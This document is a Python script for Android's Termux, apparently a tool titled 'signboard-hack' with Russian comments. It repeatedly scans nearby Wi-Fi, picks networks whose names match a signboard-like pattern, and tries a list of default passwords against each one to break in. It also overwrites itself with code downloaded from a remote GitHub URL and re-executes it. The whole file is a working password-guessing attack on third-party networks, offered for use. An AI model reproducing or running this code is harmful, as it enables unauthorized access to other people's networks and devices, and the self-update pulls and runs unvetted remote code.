import os
import time
import subprocess
import json
import sys
import hashlib
import requests
import re
from threading import Thread
import getpass
import shutil

# ===== КРИТИЧЕСКОЕ ИСПРАВЛЕНИЕ =====
TERMUX_BIN_PATH = "/data/data/com.termux/files/usr/bin"
os.environ["PATH"] = f"{TERMUX_BIN_PATH}:{os.environ['PATH']}"

# ===== ОБНОВЛЕННАЯ КОНФИГУРАЦИЯ =====
TARGET_PREFIXES = [
    # ... ваш список префиксов без изменений ...
]

PASSWORD_LIST = [
    "88888888", "888888eu", "12345678", "87654321",
    "00000000", "11111111", "admin123"
]
SCAN_INTERVAL = 15
PASSWORD = "k33rooxx"
REPO_URL = "https://raw.githubusercontent.com/keerooxx/signboard-hack/main/scanner.py"
VERSION = "1.4.1"  # Обновленная версия
# ========================

def request_android_permissions():
    """Запрашиваем необходимые разрешения без termux-setup-storage"""
    print("\n[!] ТРЕБУЮТСЯ РАЗРЕШЕНИЯ ANDROID:")
    print("1. Откройте 'Настройки' > 'Приложения' > 'Termux:API'")
    print("2. Нажмите 'Разрешения' и включите:")
    print("   - Местоположение")
    print("   - Wi-Fi подключение")
    print("3. Вернитесь и нажмите 'Дополнительно' > 'Отображать поверх других приложений' - ВКЛ")
    print("4. Нажмите 'Дополнительно' > 'Оптимизация батареи' > 'Не оптимизировать'")
    print("5. Для Termux: откройте 'Настройки' > 'Приложения' > 'Termux' > 'Разрешения' > 'Фоновые действия' - ВКЛ\n")
    
    # Даем пользователю время на настройку
    print("[~] Жду 20 секунд пока вы настроите разрешения...")
    time.sleep(20)

def check_termux_api_installation():
    """Проверяет наличие Termux:API"""
    print("[~] Проверка Termux:API...")
    try:
        # Проверяем основные команды
        for cmd in ["termux-wifi-scan", "termux-wifi-connect"]:
            if not shutil.which(cmd):
                print(f"[!] Команда {cmd} не найдена!")
                print("[~] Установите: pkg install termux-api")
                print("[~] И скачайте приложение Termux:API из Play Store")
                return False
        return True
    except Exception as e:
        print(f"[!] Ошибка проверки: {e}")
        return False

def print_banner():
    """Обновленный баннер"""
    print(r"""
 ██ ▄█▀▓█████  ██▀███   ▒█████  ▒██   ██▒
 ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒▒▒ █ █ ▒░
▓███▄░ ▒███   ▓██ ░▄█ ▒▒██░  ██▒░░  █   ░
▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  ▒██   ██░ ░ █ █ ▒ 
▒██▒ █▄░▒████▒░██▓ ▒██▒░ ████▓▒░▒██▒ ▒██▒
▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒▒ ░ ░▓ ░
░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░ ░░   ░▒ ░
░ ░░ ░    ░     ░░   ░ ░ ░ ░ ▒   ░    ░  
░  ░      ░  ░   ░         ░ ░   ░    ░  
    """)
    print(f"Wi-Fi Scanner Tool | by @krx1krx | v{VERSION}")
    print("="*45)

def auto_update():
    """Автоматическое обновление скрипта"""
    try:
        print("[~] Проверка обновлений...")
        response = requests.get(REPO_URL + "?t=" + str(time.time()), timeout=10)
        if response.status_code != 200:
            print(f"[!] Ошибка проверки обновлений: {response.status_code}")
            return False
        
        current_hash = hashlib.md5(open(__file__, 'rb').read()).hexdigest()
        new_hash = hashlib.md5(response.content).hexdigest()
        
        if current_hash == new_hash:
            print("[✓] У вас последняя версия скрипта")
            return False
        
        print("[~] Найдено обновление, устанавливаем...")
        with open(__file__, 'wb') as f:
            f.write(response.content)
        
        print("[✓] Скрипт успешно обновлен!")
        print("[~] Перезапускаю скрипт...")
        
        # Автоматический перезапуск
        os.execv(sys.executable, [sys.executable] + sys.argv)
        return True
        
    except Exception as e:
        print(f"[!] Ошибка обновления: {e}")
        return False

def check_password():
    """Проверка пароля"""
    print("[!] Для запуска требуется пароль")
    try:
        import getpass
        user_input = getpass.getpass("Введите пароль: ")
    except:
        user_input = input("Введите пароль: ")
    return user_input.strip() == PASSWORD

def is_target_network(ssid):
    """Проверка префиксов"""
    if not ssid:
        return False
    # Проверяем форматы вида WXX_XXXX
    if re.match(r"^W\d{2}_", ssid):
        return True
    # Проверяем обычные префиксы
    return any(ssid.startswith(prefix) for prefix in TARGET_PREFIXES)

def try_connect(ssid, password):
    """Попытка подключения"""
    try:
        # Используем абсолютные пути
        termux_bin = os.path.join(TERMUX_BIN_PATH, "termux-wifi-connect")
        
        result = subprocess.run(
            [termux_bin, "-s", ssid, "-p", password],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=30
        )
        
        if result.returncode == 0:
            print("    [✓] Подключение успешно")
            return True
            
        # Анализ ошибок
        if "Background start not allowed" in result.stderr:
            print("    [!] Ошибка: Запуск из фона запрещен!")
            print("    [!] Дайте разрешение 'Display over other apps' для Termux:API")
        elif "Location" in result.stderr:
            print("    [!] Ошибка: Включите геолокацию!")
        elif "Permission" in result.stderr:
            print("    [!] Ошибка: Недостаточно разрешений!")
        else:
            print(f"    [!] Ошибка подключения: {result.stderr.strip()}")
            
        return False
    except Exception as e:
        print(f"    [!] Исключение при подключении: {e}")
        return False

def test_password(ssid, password):
    """Тестирование одного пароля"""
    print(f"    [>] Проверка: {password}")
    return try_connect(ssid, password)

def hack_network(ssid):
    """Автоматический подбор паролей"""
    print(f"\n[+] Найдена вывеска: {ssid}")
    print("[!] Начинаю проверку паролей...")
    
    for password in PASSWORD_LIST:
        if test_password(ssid, password):
            print(f"    [✓] Успех! Пароль: {password}")
            print(f"\n[!] УСПЕХ! Подключено к {ssid}")
            try:
                subprocess.run(["termux-beep", "-f", "1000", "-d", "1000"])
            except:
                pass
            return True
    
    print("\n[✗] Не удалось подключиться")
    return False

def scan_wifi_networks():
    """Сканирование Wi-Fi сетей"""
    try:
        # Инициируем сканирование
        subprocess.run(
            ["termux-wifi-scan"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=10
        )
        time.sleep(3)  # Ожидание результатов
        
        # Получаем результаты
        result = subprocess.check_output(
            ["termux-wifi-scaninfo"],
            text=True,
            stderr=subprocess.DEVNULL,
            timeout=10
        )
        return result
    except Exception as e:
        print(f"[!] Ошибка сканирования: {e}")
        return ""

def parse_networks(scan_result):
    """Парсинг результатов сканирования"""
    try:
        networks = json.loads(scan_result)
        return [net["ssid"] for net in networks if "ssid" in net and net["ssid"]]
    except:
        return []

def main():
    # Добавляем путь Termux в PATH
    os.environ["PATH"] = f"{TERMUX_BIN_PATH}:{os.environ.get('PATH', '')}"
    
    # Автообновление
    if "--no-update" not in sys.argv and "--restarted" not in sys.argv:
        if auto_update():
            return

    if "--restarted" not in sys.argv:
        sys.argv.append("--restarted")
    
    print_banner()
    
    # Проверка Termux:API
    if not check_termux_api_installation():
        return
    
    # Запрос разрешений
    request_android_permissions()
    
    # Проверка пароля
    if not check_password():
        print("[!] Неверный пароль! Доступ запрещен.")
        return
    
    print("[✓] Вход выполнен успешно")
    print(f"[*] Режим: быстрое сканирование (каждые {SCAN_INTERVAL} сек)")
    
    # Основной цикл сканирования
    last_scan = time.time()
    try:
        while True:
            scan_result = scan_wifi_networks()
            
            if scan_result:
                networks = parse_networks(scan_result)
                unique_networks = list(set(networks))
                
                print(f"\n[~] Сканирование завершено. Сетей: {len(unique_networks)}")
                
                if unique_networks:
                    print(f"[i] Обнаружены сети: {', '.join(unique_networks[:5])}" + 
                          ("..." if len(unique_networks) > 5 else ""))
                
                found_targets = False
                for ssid in unique_networks:
                    if ssid and is_target_network(ssid):
                        found_targets = True
                        print(f"[+] Обнаружена целевая сеть: {ssid}")
                        Thread(target=hack_network, args=(ssid,), daemon=True).start()
                
                if not found_targets:
                    print("[i] Целевые сети не обнаружены")
            
            # Ожидание до следующего сканирования
            sleep_time = SCAN_INTERVAL - (time.time() - last_scan)
            if sleep_time > 0:
                time.sleep(sleep_time)
            last_scan = time.time()
            
    except KeyboardInterrupt:
        print("\n[!] Программа остановлена")
    except Exception as e:
        print(f"[!] Критическая ошибка: {e}")

if __name__ == "__main__":
    main()
